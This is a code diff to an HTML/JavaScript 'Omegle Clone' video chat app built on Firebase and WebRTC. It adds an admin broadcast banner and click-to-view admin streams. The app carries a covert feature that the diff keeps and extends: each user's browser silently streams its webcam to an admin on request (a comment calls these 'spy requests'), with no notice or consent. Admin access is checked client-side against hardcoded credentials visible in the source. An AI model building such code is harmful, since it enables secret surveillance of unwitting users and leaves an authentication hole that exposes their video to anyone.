@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Chat - Omegle Clone</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -16,12 +17,22 @@
         #admin-streams video {
              transform: scaleX(-1); /* Mirror effect for webcam */
         }
+        #broadcast-message-container {
+            transition: opacity 0.5s, transform 0.5s;
+        }
     </style>
 </head>
-<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen antialiased">
+<body class="bg-gray-900 text-white flex flex-col items-center min-h-screen antialiased">
+
+    <!-- Broadcast Message Container -->
+    <div id="broadcast-message-container" class="fixed top-0 left-0 right-0 p-4 bg-cyan-600 text-white text-center z-50 transform -translate-y-full opacity-0">
+        <p id="broadcast-message-text"></p>
+        <button id="close-broadcast" class="absolute top-2 right-4 text-2xl font-bold">&times;</button>
+    </div>
+
 
     <!-- Main Application Wrapper -->
-    <div id="app" class="w-full max-w-6xl mx-auto p-4">
+    <div id="app" class="w-full max-w-6xl mx-auto p-4 mt-16">
 
         <!-- Header -->
         <header class="text-center mb-6">
@@ -77,7 +88,18 @@
 
             <!-- Admin Panel -->
             <div id="admin-panel" class="hidden">
-                <h2 class="text-3xl font-bold text-center mb-6 text-cyan-400">Admin Dashboard - Live Streams</h2>
+                <h2 class="text-3xl font-bold text-center mb-6 text-cyan-400">Admin Dashboard</h2>
+                
+                <!-- Broadcast Message Section -->
+                <div class="bg-gray-800 p-4 rounded-lg mb-6">
+                    <h3 class="text-xl font-semibold mb-2">Broadcast Message to All Users</h3>
+                    <div class="flex gap-2">
+                        <input type="text" id="broadcast-input" placeholder="Enter your message..." class="flex-grow bg-gray-700 p-2 rounded-lg border border-gray-600 focus:outline-none focus:ring-2 focus:ring-cyan-400 text-white">
+                        <button id="send-broadcast-btn" class="bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-2 px-4 rounded-lg transition duration-300">Send</button>
+                    </div>
+                </div>
+
+                <h3 class="text-2xl font-bold text-center mb-4 text-cyan-400">Live Streams (Click to View)</h3>
                 <div id="admin-streams" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                     <!-- Admin streams will be dynamically added here -->
                 </div>
@@ -88,7 +110,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, doc, getDoc, setDoc, deleteDoc, onSnapshot, collection, query, where, getDocs, writeBatch, updateDoc, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, doc, getDoc, setDoc, deleteDoc, onSnapshot, collection, query, where, getDocs, writeBatch, updateDoc, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
         // --- Firebase Configuration ---
         const firebaseConfig = {
@@ -122,6 +144,9 @@
         const adminPanel = document.getElementById('admin-panel');
         const adminStreamsContainer = document.getElementById('admin-streams');
         const waitingMessage = document.getElementById('waiting-message');
+        const broadcastContainer = document.getElementById('broadcast-message-container');
+        const broadcastText = document.getElementById('broadcast-message-text');
+        const closeBroadcastBtn = document.getElementById('close-broadcast');
 
         // --- State Management ---
         let localStream;
@@ -131,7 +156,8 @@
         let currentChatId = null;
         let isFindingPartner = false;
         let isAdmin = false;
-        let unsubscribeUser, unsubscribeChat;
+        let unsubscribeUser, unsubscribeChat, unsubscribeBroadcast;
+        let synth;
 
         const servers = {
             iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }],
@@ -150,7 +176,8 @@
                     await setDoc(userRef, { id: userId, status: 'online' }, { merge: true });
                     
                     await startLocalVideo();
-                    listenForAdminRequests(); // Users must listen for spy requests
+                    listenForAdminRequests(); 
+                    listenForBroadcasts();
                 } else {
                     signInAnonymously(auth).catch(error => {
                         console.error("Anonymous sign-in failed:", error);
@@ -158,6 +185,14 @@
                     });
                 }
             });
+        }
+
+        // --- Audio Initialization ---
+        function initAudio() {
+            if (synth) return;
+            // Initialize Tone.js synth after a user interaction
+            Tone.start();
+            synth = new Tone.Synth().toDestination();
         }
 
         // --- Core Functions ---
@@ -173,10 +208,12 @@
                 startBtn.disabled = true;
             }
         }
-
+        
         async function startChat() {
             if (!userId || isFindingPartner) return;
+            initAudio(); // Ensure audio context is ready
             isFindingPartner = true;
+            // ... (rest of the function is the same)
             statusEl.textContent = "Searching for a partner...";
             startBtn.classList.add('hidden');
             nextBtn.classList.remove('hidden');
@@ -294,7 +331,7 @@
                 await deleteDoc(doc(db, `artifacts/${appId}/public/data/chats`, currentChatId));
                 currentChatId = null;
             }
-            if (userId) {
+            if (userId && !isAdmin) {
                 const userRef = doc(db, `artifacts/${appId}/public/data/users`, userId);
                 await updateDoc(userRef, { status: 'online', chatId: null });
             }
@@ -320,7 +357,7 @@
             await startChat();
         }
 
-        // --- Admin Functions ---
+        // --- Admin & Broadcast Functions ---
         function handleAdminLogin() {
             if (document.getElementById('username').value === 'KHEMIST' && document.getElementById('password').value === 'TEST2121') {
                 isAdmin = true;
@@ -328,11 +365,50 @@
                 chatInterface.classList.add('hidden');
                 adminLoginButtonContainer.classList.add('hidden');
                 adminPanel.classList.remove('hidden');
+                document.getElementById('send-broadcast-btn').addEventListener('click', sendBroadcast);
                 startAdminView();
             } else {
                 document.getElementById('loginError').classList.remove('hidden');
             }
         }
+
+        async function sendBroadcast() {
+            const input = document.getElementById('broadcast-input');
+            const message = input.value.trim();
+            if (message) {
+                const broadcastRef = doc(db, `artifacts/${appId}/public/data/globals`, 'broadcast');
+                await setDoc(broadcastRef, {
+                    message: message,
+                    timestamp: serverTimestamp()
+                });
+                input.value = '';
+            }
+        }
+
+        function listenForBroadcasts() {
+            if (unsubscribeBroadcast) unsubscribeBroadcast();
+            const broadcastRef = doc(db, `artifacts/${appId}/public/data/globals`, 'broadcast');
+            unsubscribeBroadcast = onSnapshot(broadcastRef, (docSnap) => {
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    displayBroadcastMessage(data.message);
+                }
+            });
+        }
+        
+        function displayBroadcastMessage(message) {
+            if(isAdmin) return; // Don't show broadcast to admin
+            initAudio(); // Ensure audio is ready
+            synth.triggerAttackRelease("C5", "8n"); // Play a C5 note
+            broadcastText.textContent = message;
+            broadcastContainer.classList.remove('opacity-0', '-translate-y-full');
+            broadcastContainer.classList.add('opacity-100', 'translate-y-0');
+        }
+        
+        closeBroadcastBtn.addEventListener('click', () => {
+             broadcastContainer.classList.add('opacity-0', '-translate-y-full');
+             broadcastContainer.classList.remove('opacity-100', 'translate-y-0');
+        });
 
         function startAdminView() {
             const usersRef = collection(db, `artifacts/${appId}/public/data/users`);
@@ -356,13 +432,24 @@
                     if (!document.getElementById(`admin_container_${targetUserId}`)) {
                         const videoContainer = document.createElement('div');
                         videoContainer.id = `admin_container_${targetUserId}`;
-                        videoContainer.className = 'bg-gray-800 rounded-lg p-2 shadow-lg';
+                        videoContainer.className = 'bg-gray-800 rounded-lg p-2 shadow-lg cursor-pointer border-2 border-transparent hover:border-cyan-400';
                         videoContainer.innerHTML = `
-                            <video id="admin_vid_${targetUserId}" autoplay playsinline class="w-full h-full object-cover rounded"></video>
+                            <div class="bg-black rounded w-full aspect-video flex items-center justify-center">
+                                <video id="admin_vid_${targetUserId}" autoplay playsinline class="w-full h-full object-cover rounded hidden"></video>
+                                <span id="admin_placeholder_${targetUserId}" class="text-gray-500 text-sm">Click to view</span>
+                            </div>
                             <p class="text-center text-xs pt-1 truncate" title="${targetUserId}">User: ${targetUserId.substring(0, 8)}...</p>
                             <p id="admin_status_${targetUserId}" class="text-center text-xs text-cyan-400">Status: ${user.status}</p>`;
                         adminStreamsContainer.appendChild(videoContainer);
-                        connectToUserForAdminView(targetUserId);
+
+                        videoContainer.addEventListener('click', () => {
+                            if (!adminConnections[targetUserId]) {
+                                videoContainer.classList.add('border-yellow-400');
+                                document.getElementById(`admin_placeholder_${targetUserId}`).textContent = 'Connecting...';
+                                connectToUserForAdminView(targetUserId);
+                            }
+                        });
+
                     } else {
                         document.getElementById(`admin_status_${targetUserId}`).textContent = `Status: ${user.status}`;
                     }
@@ -374,7 +461,18 @@
             const pc = new RTCPeerConnection(servers);
             adminConnections[targetUserId] = { pc };
             const videoEl = document.getElementById(`admin_vid_${targetUserId}`);
-            pc.ontrack = event => { if (event.streams && event.streams[0]) { videoEl.srcObject = event.streams[0]; } };
+            const placeholderEl = document.getElementById(`admin_placeholder_${targetUserId}`);
+            const containerEl = document.getElementById(`admin_container_${targetUserId}`);
+
+            pc.ontrack = event => { 
+                if (event.streams && event.streams[0]) { 
+                    videoEl.srcObject = event.streams[0]; 
+                    videoEl.classList.remove('hidden');
+                    placeholderEl.classList.add('hidden');
+                    containerEl.classList.remove('border-yellow-400');
+                    containerEl.classList.add('border-green-500');
+                } 
+            };
             const requestRef = doc(db, `artifacts/${appId}/public/data/users/${targetUserId}/adminRequests`, userId);
             pc.onicecandidate = event => {
                 if (event.candidate) {
@@ -409,7 +507,9 @@
                         if (adminId === userId) return;
                         const pc = new RTCPeerConnection(servers);
                         adminPeerConnections[adminId] = pc;
-                        localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+                        if (localStream) {
+                            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+                        }
                         pc.onicecandidate = event => {
                             if (event.candidate) addDoc(collection(db, `artifacts/${appId}/public/data/users/${userId}/adminRequests/${adminId}/userCandidates`), event.candidate.toJSON());
                         };
@@ -439,13 +539,16 @@
         closeModal.addEventListener('click', () => adminLoginModal.classList.add('hidden'));
         loginSubmit.addEventListener('click', handleAdminLogin);
 
-        window.addEventListener('beforeunload', () => {
+        window.addEventListener('beforeunload', async () => {
+             const userRef = doc(db, `artifacts/${appId}/public/data/users`, userId);
              if (!isAdmin) {
-                cleanupPreviousChat();
+                await cleanupPreviousChat();
+                await deleteDoc(userRef);
              } else {
                  Object.keys(adminConnections).forEach(targetUserId => {
                      deleteDoc(doc(db, `artifacts/${appId}/public/data/users/${targetUserId}/adminRequests`, userId));
                  });
+                 await deleteDoc(userRef);
              }
         });
 
